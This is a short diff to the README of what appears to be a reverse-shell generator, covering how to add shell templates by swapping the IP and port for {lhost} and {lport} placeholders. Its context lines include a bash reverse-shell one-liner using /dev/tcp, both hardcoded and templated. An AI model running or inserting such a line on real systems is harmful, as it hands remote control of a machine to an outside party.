@@ -15,7 +15,7 @@
 # Features
 ## Add new template shell or language
 1. create your new reverse shell in the shells directory.
-2. replace the ip in the script with {lhost} and then replace the port with {lport}
+2. replace the ip in the scripts directory with {lhost} and then replace the port with {lport}
 3. For example replace, bash -i >& /dev/tcp/127.0.0.1/8080 0>&1 with bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
 4. The new script will be displayed in the languages field from the help menu.
 # Examples:
